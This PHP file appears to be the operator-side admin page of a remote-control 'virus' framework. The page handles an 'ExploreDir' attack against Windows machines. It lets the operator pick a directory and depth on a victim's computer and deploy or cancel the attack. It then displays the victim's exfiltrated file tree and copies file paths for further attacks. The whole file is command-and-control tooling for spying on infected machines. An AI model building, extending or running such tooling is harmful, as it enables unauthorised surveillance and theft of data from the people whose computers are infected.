<?php

use Kelvinho\Virus\Attack\AdminTemplates;
use Kelvinho\Virus\Attack\AttackInterface;
use Kelvinho\Virus\Attack\AttackPackages\Windows\OneTime\ExploreDir;
use Kelvinho\Virus\Header;
use function Kelvinho\Virus\logAttackStatus;
use function Kelvinho\Virus\logError;
use function Kelvinho\Virus\logUnreachable;

function niceSize(int $bytes): string {
    $labels = ["TB", "GB", "MB", "KB", "bytes"];
    $amounts = [1000000000000, 1000000000, 1000000, 1000, 1];
    $index = 0;
    if ($bytes == 0) {
        return "0 bytes";
    }
    while (true) {
        if ($bytes >= $amounts[$index]) {
            return ($bytes / $amounts[$index]) . " " . $labels[$index];
        }
        $index += 1;
    }
    logUnreachable("ExploreDir admin page, niceSize");
    return "";
}

/*
How this stuff below even work? I'm too lazy to explain, but this flow should give you a rough understanding:

so,
0f0
0f1
0d2
	1f3
	1f4
	1f5
	1d6
		2f7
		2f8
		2d9
		2d10
			3f11
	1d12
	1d13
0d14
	1f15
process 0f0, reads, echos, return "", or successful, and there are still elements left
process 0f1, reads, echos, return "", or successful, and there are still elements left
process 0d2, given depth 0 by hand, no prev, reads, echos. Loops
	process 1f3, reads, echos, return ""
	process 1f4, reads, echos, return ""
	process 1f5, reads, echos, return ""
	process 1d6, given depth 1 by 0d2, no prev, reads, echos. Loops:
		process 2f7, echos, return ""
		process 2f8, echos, return ""
		process 2d9, given depth 2 by 1d6, no prev, reads, echos. Loops:
			process 2d10, given depth 3 by 2d9, no prev, reads. Sees new depth lower than given, does not process, return "unprocessed 2d10" and does not echo
			sees unprocessed line, break, look into unprocessed line, depth (2) equal given depth (2), return the same unprocessed line of 2d10
		sees unprocessed line 2d10, break, look into unprocessed line 2d10, see depth (2) larger than given depth (1), process the unprocessed line 2d10, given depth 2 by 1d6, prev, echos. Loops:
			process 3f11, echos, return ""
			process 1d12, given depth 3 by 2d10, no prev, reads. Sees new depth (1) lower than given (3), does not process, return "unprocessed 1d12" and does not echo
			sees unprocessed line 1d12, break, look into unprocessed line, see depth (1) smaller than given depth (2), return "unprocessed 1d12" and does not echo
		sees unprocessed line 1d12, break, look into unprocessed line, see depth (1) equal given depth (1), return "unprocessed 1d12" and does not echo
	sees unprocessed line 1d12, break, look into unprocessed line, see depth (1) larger than given depth (0), process the unprocessed line 1d12, given depth 1 by 0d2, prev, echos. Loops:
		process 1d13, given depth 2 by 1d12, no prev, reads. Sees new depth (1) lower than given depth (2), does not process, return "unprocessed 1d13" and does not echo

*/

function processLine($handle, int $givenDepth, array &$path, string $unprocessedLine = null): ?string {
    if ($unprocessedLine != null) {
        if (empty(trim($unprocessedLine))) {
            logUnreachable("ExploreDir package, admin screen");
        }
        $lineDepth = (int)explode(";", $unprocessedLine)[0];
        if ($lineDepth < $givenDepth) {
            return $unprocessedLine;
        }
        $line = $unprocessedLine;
    } else {
        $line = fgets($handle);
        if ($line === false) {
            return null;
        }
        if (empty(trim($line))) {
            return null;
        }
    }
    $contents = \Kelvinho\Virus\map(explode(";", $line), function ($element) {
        return trim($element);
    });
    switch ($contents[1]) {
        case "f": ?>
            <li>
                <pre onclick="copyToClipboard('<?php echo join("\\\\", $path) . "\\\\" . $contents[4]; ?>')"><?php echo $contents[4]; ?>, size: <?php echo niceSize((int)$contents[2]); ?>, last updated: <?php echo $contents[3]; ?></pre>
            </li>
            <?php return "";
        case "d":
            $lineDepth = (int)$contents[0];
            if ($lineDepth < $givenDepth) {
                return $line;
            }
            $hash = "id_" . hash("sha256", rand()); ?>
            <li>
                <pre onclick="toggle('<?php echo $hash; ?>')"
                     style="cursor: pointer;"><b><?php echo trim($contents[4]); ?>, last updated: <?php echo $contents[3]; ?></b></pre>
                <ul id="<?php echo $hash; ?>" style="list-style-type: none;" class="folding">
                    <?php
                    $unprocessedLine = null;
                    array_push($path, trim($contents[4]));
                    while (true) {
                        $unprocessedLine = processLine($handle, $givenDepth + 1, $path, $unprocessedLine);
                        if ($unprocessedLine === null) {
                            break;
                        }
                        if ($unprocessedLine !== "") {
                            $contents = explode(";", $unprocessedLine);
                            if (((int)$contents[0]) <= $givenDepth) { // return unprocessed line
                                break;
                            }
                        }
                    }
                    array_pop($path);
                    ?>
                </ul>
            </li>
            <?php
            if ($unprocessedLine != null) {
                return $unprocessedLine;
            }
            return "";
        default:
            logUnreachable("ExploreDir package, admin screen, f|d");
            return null;
    }
}

if (!isset($_SESSION["attack_id"])) {
    header("Location: " . DOMAIN);
    Header::redirect();
} else {
    $attack = AttackInterface::get($_SESSION["attack_id"]);
    ?>
    <html lang="en_US">
    <?php echo AdminTemplates::header(); ?>
    <body>
    <?php echo AdminTemplates::body($attack); ?>
    <div>Max depth</div>
    <input class="w3-input" type="text" id="depth"
           value="<?php echo $attack->getMaxDepth(); ?>" <?php if ($attack->getStatus() != AttackInterface::STATUS_DORMANT) {
        echo "disabled";
    }; ?>>
    <br>
    <div>Directory</div>
    <input class="w3-input" type="text" id="dir"
           value="<?php echo $attack->getRootDir(); ?>" <?php if ($attack->getStatus() != AttackInterface::STATUS_DORMANT) {
        echo "disabled";
    }; ?>>
    <?php
    switch ($attack->getStatus()) {
        case AttackInterface::STATUS_DORMANT: ?>
            <p>Place the directory you want to explore above. If the directory to explore has too many files and folders
                to go through, the virus will automatically stop the payload after <?php echo ExploreDir::$maxLines ?>
                files and folders. You can limit the depth the virus will explore (and in turn, will cover more, but
                shallower folders) by specifying it in the max depth field above. The default
                is <?php echo ExploreDir::$defaultDepth; ?> which I think is effectively infinity on most computers.</p>
            <p>Also please note that exploring directories can take a long time so please be patient. Here are a list of
                benchmarks to help you gauge how long it takes:</p>
            <ul>
                <li>C:\Users, 4 minutes 4 seconds, 84000 files and directories</li>
                <li>C:\Program Files, 50 seconds, 25000 files and directories</li>
                <li>C:\, 23 minutes, 387000 files and directories and ongoing. I had to stop it because it has bored me
                    out of my mind
                </li>
            </ul>
            <?php break;
        case AttackInterface::STATUS_DEPLOYED: ?>
            <p>If you wish to edit the directory and max depth, change it to dormant mode below.</p>
            <?php break;
        case AttackInterface::STATUS_EXECUTED:
            ?><br><?php
            break;
        default:
            logError("Attack status of " . $attack->getStatus() . " does not exist");
    }
    ?>
    <div class="w3-button w3-red" onclick="update()">Update</div>
    <?php
    switch ($attack->getStatus()) {
        case AttackInterface::STATUS_DORMANT: ?>
            <p>This attack is dormant. Click <a onclick="deployAttack()" class="link">here</a> to deploy.</p>
            <?php break;
        case AttackInterface::STATUS_DEPLOYED: ?>
            <p>This attack is deployed. Click <a onclick="cancelAttack()" class="link">here</a> to cancel the attack.
            </p>
            <?php break;
        case AttackInterface::STATUS_EXECUTED: ?>
            <p>This attack is executed. Bold lines are the directories. You can click on them to either expand or
                collapse a directory. Click <a onclick="collapseAll()" style="color: blue; cursor: pointer">here</a> to
                collapse all. You can also click on files to copy their address for other purposes.</p>
            <p>Please note that this might not be all of the files available. The maximum number of files and folders
                scanned are <?php echo ExploreDir::$maxLines ?>. Also if nothing is displayed below, it could be that
                the folder really does not have anything in it, or you have entered a nonexistent directory.</p>
            <p>This is the file tree of <?php echo $attack->getRootDir(); ?></p>
            <?php
            $handle = fopen(DATA_FILE . "/attacks/" . $attack->getAttackId() . "/dirs.txt", "r");
            if ($handle === false) {
                ?>(Can't read internal file)<?php
            }
            fgets($handle); // skips first line, cuz it's supposed to be empty
            ?>
            <ul style="list-style-type: none;overflow: auto;">
                <?php
                $unprocessedLine = null;
                $path = [str_replace("\\", "\\\\", $attack->getRootDir())];
                while (true) {
                    $unprocessedLine = processLine($handle, 0, $path, $unprocessedLine);
                    if ($unprocessedLine === null) {
                        break;
                    }
                }
                ?>
            </ul>
            <?php
            fclose($handle);
            break;
        default:
            logAttackStatus($attack->getStatus());
    }
    ?>
    <input id="copyPlace" style="display: none;" type="text">
    </body>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
    <script type="text/javascript" src="https://157239n.com/page/assets/js/main.js"></script>
    <script type="application/javascript">
        function update() {
            $.ajax({
                url: "<?php echo DOMAIN_CONTROLLER . "/updateAttack.php"; ?>",
                type: "POST",
                data: {
                    virus_id: "<?php echo $attack->getVirusId(); ?>",
                    attack_id: "<?php echo $attack->getAttackId(); ?>",
                    name: $("#name").val(),
                    profile: $("#profile").val()
                    <?php if ($attack->getStatus() == AttackInterface::STATUS_DORMANT) { ?>
                    , dir: $("#dir").val()
                    , depth: $("#depth").val()
                    <?php } ?>
                },
                success: function () {
                    window.location = "<?php echo DOMAIN_ATTACK_INFO; ?>"
                }
            });
        }

        function toggle(id) {
            const element = $("#" + id);
            if (element.css("display") === "block") {
                element.css("display", "none");
            } else {
                element.css("display", "block");
            }
        }

        function collapseAll() {
            $(".folding").css("display", "none");
        }

        function copyToClipboard(textToCopy) {
            console.log("recorded");
            const tmpCopyPlace = $("#copyPlace");
            tmpCopyPlace.val(textToCopy);
            tmpCopyPlace.css("display", "");
            let copyPlace = document.getElementById("copyPlace");
            copyPlace.select();
            document.execCommand("copy");
            tmpCopyPlace.css("display", "none");
        }
    </script>
    <?php echo AdminTemplates::script($attack); ?>
    </html>
<?php } ?>